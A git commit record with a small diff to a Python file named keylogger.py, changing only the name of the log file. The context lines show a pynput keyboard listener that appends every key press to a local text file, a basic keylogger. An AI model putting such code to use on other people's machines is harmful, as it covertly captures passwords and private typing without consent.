6b68f3c37f89b4f20c8dc41e373b690982fc17de
Abhishek Gupta <95430676+Abhi-gits@users.noreply.github.com>
2022-01-06 18:48:30 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,7 @@ from pynput.keyboard import Listener
 def write_file(key):
     keydata = str(key)
     keydata = keydata.replace("'"," ")
-    with open("log5.text","a") as f:
+    with open("log.text","a") as f:
         f.write(keydata)
 
 with Listener(on_press=write_file)as l:
